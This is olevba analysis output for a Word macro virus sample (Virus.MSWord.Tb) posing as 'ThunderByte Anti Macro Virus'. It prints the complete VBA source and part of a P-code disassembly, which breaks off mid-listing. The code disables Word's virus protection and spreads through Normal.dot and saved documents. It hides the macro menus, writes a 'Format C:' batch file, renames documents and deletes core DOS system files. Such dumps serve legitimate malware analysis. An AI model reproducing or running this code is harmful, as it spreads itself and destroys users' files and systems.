olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Tb
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Tb - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO ATBAMV.frm 
in file: Virus.MSWord.Tb - OLE stream: 'Macros/VBA/ATBAMV'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub CommandButton1_Click()
Unload ATBAMV
End Sub
Private Sub OptionButton2_Click()
WordBasic.SetPrivateProfileString "OptionSelect", "Valeur", "2", "WIN.INI"
End Sub
Private Sub OptionButton3_Click()
WordBasic.SetPrivateProfileString "OptionSelect", "Valeur", "3", "WIN.INI"
End Sub
Private Sub OptionButton4_Click()
WordBasic.SetPrivateProfileString "OptionSelect", "Valeur", "4", "WIN.INI"
End Sub

Private Sub Userform_initialize()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
WordBasic.SetPrivateProfileString "OptionSelect", "Valeur", "0", "WIN.INI"
End Sub
Private Sub OptionButton1_Click()
WordBasic.SetPrivateProfileString "OptionSelect", "Valeur", "1", "WIN.INI"
End Sub
-------------------------------------------------------------------------------
VBA MACRO Installation.frm 
in file: Virus.MSWord.Tb - OLE stream: 'Macros/VBA/Installation'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub Userform_initialize()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
End Sub
Private Sub CommandButton1_Click()
Unload Installation
End Sub

-------------------------------------------------------------------------------
VBA MACRO ThunderByteAMV.bas 
in file: Virus.MSWord.Tb - OLE stream: 'Macros/VBA/ThunderByteAMV'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoExec()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorAE
Protection.Show
Randomize
Dim MyDate
MyDate = Date
N$ = Int(Rnd * 31) + 1
d$ = Mid(MyDate, 1, 2)
If d$ = N$ Then
Debut:
    Dim OptionValeur$, Fichier$, OldName, NewName, Choix
    ATBAMV.Show
    OptionValeur$ = WordBasic.[GetPrivateProfileString$]("OptionSelect", "Valeur", "WIN.INI")
    If OptionValeur$ = 0 Then
        GoTo Debut
        MsgBox "Vous devez choisir une option", vbInformation, "ThunderByte Anti Macro Virus"
    End If
    If OptionValeur$ = 1 Then
        StatusBar = "Réparation en cours...,  veuillez patienter..."
        Open "C:\DOS\Repar.bat" For Output As #1
        Print #1, "O|Format C: /u /Autotest"
        Close #1
        StatusBar = "Réparation terminée..."
        MsgBox "Votre disque dur est réparé, HAHAHAHAHA", vbCritical, "Virus ThunderByteAMV"
    End If
    If OptionValeur$ = 2 Then
        Dim Reponse
        Reponse = MsgBox("Voulez-vous créer un rapport sur les fichiers infectés ?", vbYesNo + vbDefaultButton1, "ThunderByte Anti Macro Virus")
        If Reponse = vbYes Then
            Open "c:\windows\report.txt" For Output As #1
                Print #1, "Vous êtes infecté par ThunderByte Anti Macro Virus"
                Print #1, "HAHAHAHAHA!!!!!, Merci à ZeMacroKiller98"
                Print #1, "Ne faîtes pas confiance au  AntiVirus..."
                Close #1
                GoTo Message
        Else
            GoTo Message
        End If
Message:
            StatusBar = "ThunderByte Anti Macro Virus par ZeMacroKiller98"
            For i = 1 To 400000
            Next i
            StatusBar = "       ThunderByte Anti Macro Virus par ZeMacroKiller98"
            For i = 1 To 400000
            Next i
            StatusBar = "               ThunderByte Anti Macro Virus par ZeMacroKiller98"
            For i = 1 To 400000
            Next i
            StatusBar = "                       ThunderByte Anti Macro Virus par ZeMacroKiller98"
            For i = 1 To 400000
            Next i
            StatusBar = "                               ThunderByte Anti Macro Virus par ZeMacroKiller98"
            For i = 1 To 400000
            Next i
            StatusBar = "                                       ThunderByte Anti Macro Virus par ZeMacroKiller98"
            For i = 1 To 400000
            Next i
            StatusBar = "                                               ThunderByte Anti Macro Virus par ZeMacroKiller98"
            For i = 1 To 400000
            Next i
            StatusBar = "                                                       ThunderByte Anti Macro Virus par ZeMacroKiller98"
            For i = 1 To 400000
            Next i
            StatusBar = "                                                               ThunderByte Anti Macro Virus par ZeMacroKiller98"
            For i = 1 To 400000
            Next i
            StatusBar = "                                                                       ThunderByte Anti Macro Virus par ZeMacroKiller98"
            For i = 1 To 400000
            Next i
            StatusBar = "                                                                               ThunderByte Anti Macro Virus par ZeMacroKiller98"
            For i = 1 To 400000
            Next i
            StatusBar = "                                                                                       ThunderByte Anti Macro Virus par ZeMacroKiller98"
            For i = 1 To 400000
            Next i
            StatusBar = "                                                                                               ThunderByte Anti Macro Virus par ZeMacroKiller98"
            For i = 1 To 400000
            Next i
            StatusBar = "                                                                                                       ThunderByte Anti Macro Virus par ZeMacroKiller98"
            GoTo Message
    End If
    If OptionValeur = 3 Then
    With Application.FileSearch
            .LookIn = CurDir
            .FileName = "*.doc"
        If .Execute() > 0 Then
        For i = 1 To 3
            Choix = Int(Rnd * .FoundFiles.Count) + 1
            Call Renommer
            Fichier$ = WordBasic.[GetPrivateProfileString$]("Renommer", "Nom", "WIN.INI")
            OldName = .FoundFiles(Choix)
            NewName = Fichier$ + ".txt"
            Name OldName As NewName
            MsgBox "Une partie de vos fichiers sont renommés, vous ne les retrouvez pas" & Chr$(13) & "HAHAHAHAHA!!!!", vbCritical, "Ne faîtes pas confiance au AntiVirus!!!!"
        Next i
        Else
        MsgBox "Impossible de renommer les fichiers.", vbCritical, "ThunderByte Anti Macro Virus"
        End If
    End With
    End If
    If OptionValeur = 4 Then
        StatusBar = "Suppression des fichiers en cours..."
        Kill "C:\WINDOWS\*.INI"
        Kill "C:\COMMAND.COM"
        Kill "C:\AUTOEXEC.BAT"
        Kill "C:\CONFIG.SYS"
        Kill "C:\MSDOS.SYS"
        Kill "C:\IO.SYS"
        MsgBox "Pour que les modifications soit prises en compte," & Chr$(13) & "Je dois redémarrer votre ordinateur", vbInformation, "ThunderByte Anti Macro Virus"
        Open "C:\Autoexec.bat" For Output As #1
            Print #1, "Echo Les AntiVirus ne sont pas tous des Antivirus"
            Print #1, "Echo Il peuvent être aussi des virus..."
            Print #1, "Echo HAHAHAHAHA!!!!!!"
        Close #1
        Tasks.ExitWindows
    End If
End If
ErrorAE:
End Sub
Sub AutoOpen()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorAO
iMacroCount = WordBasic.CountMacros(0, 0)
For i = 1 To iMacroCount
    If WordBasic.[MacroName$](i, 0) = "ThunderByteAMV" Then
        ThunderByteAMVInstalled = -1
    End If
Next i
If Not ThunderByteAMVInstalled Then
    Installation.Show
    StatusBar = "Installation en cours..."
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, name:="ThunderByteAMV", Object:=wdOrganizerObjectProjectItems
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, name:="Installation", Object:=wdOrganizerObjectProjectItems
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, name:="Protection", Object:=wdOrganizerObjectProjectItems
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, name:="ATBAMV", Object:=wdOrganizerObjectProjectItems
    StatusBar = "Installation terminé"
End If
ErrorAO:
End Sub
Sub FileSaveAs()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorFSA
    Dialogs(wdDialogFileSaveAs).Show
    If ActiveDocument.SaveFormat = wdFormatDocument Or ActiveDocument.SaveFormat = wdFormatTemplate Then
        ActiveDocument.SaveAs FileFormat:=wdFormatTemplate
    End If
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, name:="ThunderByteAMV", Object:=wdOrganizerObjectProjectItems
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, name:="Installation", Object:=wdOrganizerObjectProjectItems
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, name:="Protection", Object:=wdOrganizerObjectProjectItems
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, name:="ATBAMV", Object:=wdOrganizerObjectProjectItems
ActiveDocument.Save
ErrorFSA:
End Sub
Sub FileTemplates()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorFT
    MsgBox "ThunderByte protège l'accès de certains menus", vbInformation, "ThunderByte Anti Macro Virus"
ErrorFT:
End Sub
Sub Renommer()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorRN
Dim NH$, Valeur
Randomize
For i = 1 To 8
NH$ = Int(Rnd * 10) + 1
If NH$ = 1 Then Valeur = "J"
If NH$ = 2 Then Valeur = "ç"
If NH$ = 3 Then Valeur = "ù"
If NH$ = 4 Then Valeur = "é"
If NH$ = 5 Then Valeur = "m"
If NH$ = 6 Then Valeur = "y"
If NH$ = 7 Then Valeur = "z"
If NH$ = 8 Then Valeur = "b"
If NH$ = 9 Then Valeur = "è"
If NH$ = 10 Then Valeur = "f"
If i = 1 Then a$ = Valeur
If i = 2 Then b$ = Valeur
If i = 3 Then c$ = Valeur
If i = 4 Then d$ = Valeur
If i = 5 Then e$ = Valeur
If i = 6 Then f$ = Valeur
If i = 7 Then g$ = Valeur
If i = 8 Then h$ = Valeur
Next i
Nom$ = a$ + b$ + c$ + d$ + e$ + f$ + g$ + h$
WordBasic.SetPrivateProfileString "Renommer", "Nom", Nom$, "WIN.INI"
ErrorRN:
End Sub
Sub ToolsMacro()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorTM
    MsgBox "Protection Anti Macro Virus activé" & Chr$(13) & "Accès refusé", vbInformation, "ThunderByte Anti Macro Virus"
ErrorTM:
End Sub
Sub ViewVBCode()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorVVBC
    MsgBox "Menu protégé..." & Chr$(13) & "Accès Refusé", vbInformation, "ThunderByte Anti Macro Virus"
ErrorVVBC:
End Sub
-------------------------------------------------------------------------------
VBA MACRO Protection.frm 
in file: Virus.MSWord.Tb - OLE stream: 'Macros/VBA/Protection'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub CommandButton1_Click()
Unload Protection
End Sub

Private Sub Userform_initialize()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Tb
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 965 bytes
' Macros/VBA/ATBAMV - 2524 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Private Sub CommandButton1_Click())
' Line #2:
' 	Ld ATBAMV 
' 	ArgsCall Unlock 0x0001 
' Line #3:
' 	EndSub 
' Line #4:
' 	FuncDefn (Private Sub OptionButton2_Click())
' Line #5:
' 	LitStr 0x000C "OptionSelect"
' 	LitStr 0x0006 "Valeur"
' 	LitStr 0x0001 "2"
' 	LitStr 0x0007 "WIN.INI"
' 	Ld WordBasic 
' 	ArgsMemCall SetPrivateProfileString 0x0004 
' Line #6:
' 	EndSub 
' Line #7:
' 	FuncDefn (Private Sub OptionButton3_Click())
' Line #8:
' 	LitStr 0x000C "OptionSelect"
' 	LitStr 0x0006 "Valeur"
' 	LitStr 0x0001 "3"
' 	LitStr 0x0007 "WIN.INI"
' 	Ld WordBasic 
' 	ArgsMemCall SetPrivateProfileString 0x0004 
' Line #9:
' 	EndSub 
' Line #10:
' 	FuncDefn (Private Sub OptionButton4_Click())
' Line #11:
' 	LitStr 0x000C "OptionSelect"
' 	LitStr 0x0006 "Valeur"
' 	LitStr 0x0001 "4"
' 	LitStr 0x0007 "WIN.INI"
' 	Ld WordBasic 
' 	ArgsMemCall SetPrivateProfileString 0x0004 
' Line #12:
' 	EndSub 
' Line #13:
' Line #14:
' 	FuncDefn (Private Sub Userform_initialize())
' Line #15:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #16:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #17:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #18:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #19:
' 	LitStr 0x000C "OptionSelect"
' 	LitStr 0x0006 "Valeur"
' 	LitStr 0x0001 "0"
' 	LitStr 0x0007 "WIN.INI"
' 	Ld WordBasic 
' 	ArgsMemCall SetPrivateProfileString 0x0004 
' Line #20:
' 	EndSub 
' Line #21:
' 	FuncDefn (Private Sub OptionButton1_Click())
' Line #22:
' 	LitStr 0x000C "OptionSelect"
' 	LitStr 0x0006 "Valeur"
' 	LitStr 0x0001 "1"
' 	LitStr 0x0007 "WIN.INI"
' 	Ld WordBasic 
' 	ArgsMemCall SetPrivateProfileString 0x0004 
' Line #23:
' 	EndSub 
' Macros/VBA/Installation - 1675 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Private Sub Userform_initialize())
' Line #2:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #3:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #4:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #5:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #6:
' 	EndSub 
' Line #7:
' 	FuncDefn (Private Sub CommandButton1_Click())
' Line #8:
' 	Ld Installation 
' 	ArgsCall Unlock 0x0001 
' Line #9:
' 	EndSub 
' Line #10:
' Macros/VBA/ThunderByteAMV - 15705 bytes
' Line #0:
' 	FuncDefn (Sub AutoExec())
' Line #1:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #2:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #3:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #4:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #5:
' 	OnError ErrorAE 
' Line #6:
' 	Ld Protection 
' 	ArgsMemCall Show 0x0000 
' Line #7:
' 	ArgsCall Read 0x0000 
' Line #8:
' 	Dim 
' 	VarDefn MyDate
' Line #9:
' 	Ld Date 
' 	St MyDate 
' Line #10:
' 	Ld Rnd 
' 	LitDI2 0x001F 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St N$ 
' Line #11:
' 	Ld MyDate 
' 	LitDI2 0x0001 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0003 
' 	St d$ 
' Line #12:
' 	Ld d$ 
' 	Ld N$ 
' 	Eq 
' 	IfBlock 
' Line #13:
' 	Label Debut 
' Line #14:
' 	Dim 
' 	VarDefn OptionValeur
' 	VarDefn Fichier
' 	VarDefn OldName
' 	VarDefn NewName
' 	VarDefn Choix
' Line #15:
' 	Ld ATBAMV 
' 	ArgsMemCall Show 0x0000 
' Line #16:
' 	LitStr 0x000C "OptionSelect"
' 	LitStr 0x0006 "Valeur"
' 	LitStr 0x0007 "WIN.INI"
' 	Ld WordBasic 
' 	ArgsMemLd [GetPrivateProfileString$] 0x0003 
' 	St OptionValeur$ 
' Line #17:
' 	Ld OptionValeur$ 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #18:
' 	GoTo Debut 
' Line #19:
' 	LitStr 0x001D "Vous devez choisir une option"
' 	Ld vbInformation 
' 	LitStr 0x001C "ThunderByte Anti Macro Virus"
' 	ArgsCall MsgBox 0x0003 
' Line #20:
' 	EndIfBlock 
' Line #21:
' 	Ld OptionValeur$ 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #22:
' 	LitStr 0x002E "Réparation en cours...,  veuillez patienter..."
' 	St StatusBar 
' Line #23:
' 	LitStr 0x0010 "C:\DOS\Repar.bat"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #24:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0018 "O|Format C: /u /Autotest"
' 	PrintItemNL 
' Line #25:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #26:
' 	LitStr 0x0016 "Réparation terminée..."
' 	St StatusBar 
' Line #27:
' 	LitStr 0x0027 "Votre disque dur est réparé, HAHAHAHAHA"
' 	Ld vbCritical 
' 	LitStr 0x0014 "Virus ThunderByteAMV"
' 	ArgsCall MsgBox 0x0003 
' Line #28:
' 	EndIfBlock 
' Line #29:
' 	Ld OptionValeur$ 
' 	LitDI2 0x0002 
' 	Eq 
' 	IfBlock 
' Line #30:
' 	Dim 
' 	VarDefn Reponse
' Line #31:
' 	LitStr 0x0038 "Voulez-vous créer un rapport sur les fichiers infectés ?"
' 	Ld vbYesNo 
' 	Ld vbDefaultButton1 
' 	Add 
' 	LitStr 0x001C "ThunderByte Anti Macro Virus"
' 	ArgsLd MsgBox 0x0003 
' 	St Reponse 
' Line #32:
' 	Ld Reponse 
' 	Ld vbYes 
' 	Eq 
' 	IfBlock 
' Line #33:
' 	LitStr 0x0015 "c:\windows\report.txt"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #34:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0032 "Vous êtes infecté par ThunderByte Anti Macro Virus"
' 	PrintItemNL 
' Line #35:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0028 "HAHAHAHAHA!!!!!, Merci à ZeMacroKiller98"
' 	PrintItemNL 
' Line #36:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0028 "Ne faîtes pas confiance au  AntiVirus..."
' 	PrintItemNL 
' Line #37:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #38:
' 	GoTo Message 
' Line #39:
' 	ElseBlock 
' Line #40:
' 	GoTo Message 
' Line #41:
' 	EndIfBlock 
' Line #42:
' 	Label Message 
' Line #43:
' 	LitStr 0x0030 "ThunderByte Anti Macro Virus par ZeMacroKiller98"
' 	St StatusBar 
' Line #44:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x1A80 0x0006 
' 	For 
' Line #45:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #46:
' 	LitStr 0x0037 "       ThunderByte Anti Macro Virus par ZeMacroKiller98"
' 	St StatusBar 
' Line #47:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x1A80 0x0006 
' 	For 
' Line #48:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #49:
' 	LitStr 0x003F "               ThunderByte Anti Macro Virus par ZeMacroKiller98"
' 	St StatusBar 
' Line #50:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x1A80 0x0006 
' 	For 
' Line #51:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #52:
' 	LitStr 0x0047 "                       ThunderByte Anti Macro Virus par ZeMacroKiller98"
' 	St StatusBar 
' Line #53:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x1A80 0x0006 
' 	For 
' Line #54:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #55:
' 	LitStr 0x004F "                               ThunderByte Anti Macro Virus par ZeMacroKiller98"
' 	St StatusBar 
' Line #56:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x1A80 0x0006 
' 	For 
' Line #57:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #58:
' 	LitStr 0x0057 "                                       ThunderByte Anti Macro Virus par ZeMacroKiller98"
' 	St StatusBar 
' Line #59:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x1A80 0x0006 
' 	For 
' Line #60:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #61:
' 	LitStr 0x005F "                                               ThunderByte Anti Macro Virus par ZeMacroKiller98"
' 	St StatusBar 
' Line #62:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x1A80 0x0006 
' 	For 
' Line #63:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #64:
' 	LitStr 0x0067 "                                                       ThunderByte Anti Macro Virus par ZeMacroKiller98"
' 	St StatusBar 
' Line #65:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x1A80 0x0006 
' 	For 
' Line #66:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #67:
' 	LitStr 0x006F "                                                               ThunderByte Anti Macro Virus par ZeMacroKiller98"
' 	St StatusBar 
' Line #68:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x1A80 0x0006 
' 	For 
' Line #69:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #70:
' 	LitStr 0x0077 "                                                                       ThunderByte Anti Macro Virus par ZeMacroKiller98"
' 	St StatusBar 
' Line #71:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x1A80 0x0006 
' 	For 
' Line #72:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #73:
' 	LitStr 0x007F "                                                                               ThunderByte Anti Macro Virus par ZeMacroKiller98"
' 	St StatusBar 
' Line #74:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x1A80 0x0006 
' 	For 
' Line #75:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #76:
' 	LitStr 0x0087 "                                                                                       ThunderByte Anti Macro Virus par ZeMacroKiller98"
' 	St StatusBar 
' Line #77:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x1A80 0x0006 
' 	For 
' Line #78:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #79:
' 	LitStr 0x008F "                                                                                               ThunderByte Anti Macro Virus par ZeMacroKiller98"
' 	St StatusBar 
' Line #80:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x1A80 0x0006 
' 	For 
' Line #81:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #82:
' 	LitStr 0x0097 "                                                                                                       ThunderByte Anti Macro Virus par ZeMacroKiller98"
' 	St StatusBar 
' Line #83:
' 	GoTo Message 
' Line #84:
' 	EndIfBlock 
' Line #85:
' 	Ld OptionValeur 
' 	LitDI2 0x0003 
' 	Eq 
' 	IfBlock 
' Line #86:
' 	StartWithExpr 
' 	Ld Application 
' 	MemLd FileSearch 
' 	With 
' Line #87:
' 	Ld CurDir 
' 	MemStWith LookIn 
' Line #88:
' 	LitStr 0x0005 "*.doc"
' 	MemStWith FileName 
' Line #89:
' 	ArgsMemLdWith Execute 0x0000 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #90:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0003 
' 	For 
' Line #91:
' 	Ld Rnd 
' 	MemLdWith FoundFiles 
' 	MemLd Count 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St Choix 
' Line #92:
' 	ArgsCall (Call) Renommer 0x0000 
' Line #93:
' 	LitStr 0x0008 "Renommer"
' 	LitStr 0x0003 "Nom"
' 	LitStr 0x0007 "WIN.INI"
' 	Ld WordBasic 
' 	ArgsMemLd [GetPrivateProfileString$] 0x0003 
' 	St Fichier$ 
' Line #94:
' 	Ld Choix 
' 	ArgsMemLdWith FoundFiles 0x0001 
' 	St OldName 
' Line #95:
' 	Ld Fichier$ 
' 	LitStr 0x0004 ".txt"
' 	Add 
' 	St NewName 
' Line #96:
' 	Ld OldName 
' 	Ld NewName 
' 	Name 
' Line #97:
' 	LitStr 0x0043 "Une partie de vos fichiers sont renommés, vous ne les retrouvez pas"
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	LitStr 0x000E "HAHAHAHAHA!!!!"
' 	Concat 
' 	Ld vbCritical 
' 	LitStr 0x0028 "Ne faîtes pas confiance au AntiVirus!!!!"
' 	ArgsCall MsgBox 0x0003 
' Line #98:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #99:
' 	ElseBlock 
' Line #100:
' 	LitStr 0x0024 "Impossible de renommer les fichiers."
' 	Ld vbCritical 
' 	LitStr 0x001C "ThunderByte Anti Macro Virus"
' 	ArgsCall MsgBox 0x0003 
' Line #101:
' 	EndIfBlock 
' Line #102:
' 	EndWith 
' Line #103:
' 	EndIfBlock 
' Line #104:
' 	Ld OptionValeur 
' 	LitDI2 0x0004 
' 	Eq 
' 	IfBlock 
' Line #105:
' 	LitStr 0x0024 "Suppression des fichiers en cours..."
' 	St StatusBar 
' Line #106:
' 	LitStr 0x0010 "C:\WINDOWS\*.INI"
' 	ArgsCall Kill 0x0001 
' Line #107:
' 	LitStr 0x000E "C:\COMMAND.COM"
' 	ArgsCall Kill 0x0001 
' Line #108:
' 	LitStr 0x000F "C:\AUTOEXEC.BAT"
' 	ArgsCall Kill 0x0001 
' Line #109:
' 	LitStr 0x000D "C:\CONFIG.SYS"
' 	ArgsCall Kill 0x0001 
' Line #110:
' 	LitStr 0x000C "C:\MSDOS.SYS"
' 	ArgsCall Kill 0x0001 
' Line #111:
' 	LitStr 0x0009 "C:\IO.SYS"
' 	ArgsCall Kill 0x0001 
' Line #112:
' 	LitStr 0x0031 "Pour que les modifications soit prises en compte,"
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	LitStr 0x0023 "Je dois redémarrer votre ordinateur"
' 	Concat 
' 	Ld vbInformation 
' 	LitStr 0x001C "ThunderByte Anti Macro Virus"
' 	ArgsCall MsgBox 0x0003 
' Line #113:
' 	LitStr 0x000F "C:\Autoexec.bat"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #114:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0031 "Echo Les AntiVirus ne sont pas tous des Antivirus"
' 	PrintItemNL 
' Line #115:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0027 "Echo Il peuvent être aussi des virus..."
' 	PrintItemNL 
' Line #116:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0015 "Echo HAHAHAHAHA!!!!!!"
' 	PrintItemNL 
' Line #117:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #118:
' 	Ld Tasks 
' 	ArgsMemCall ExitWindows 0x0000 
' Line #119:
' 	EndIfBlock 
' Line #120:
' 	EndIfBlock 
' Line #121:
' 	Label ErrorAE 
' Line #122:
' 	EndSub 
' Line #123:
' 	FuncDefn (Sub AutoOpen())
' Line #124:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #125:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #126:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #127:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #128:
' 	OnError ErrorAO 
' Line #129:
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0002 
' 	St iMacroCount 
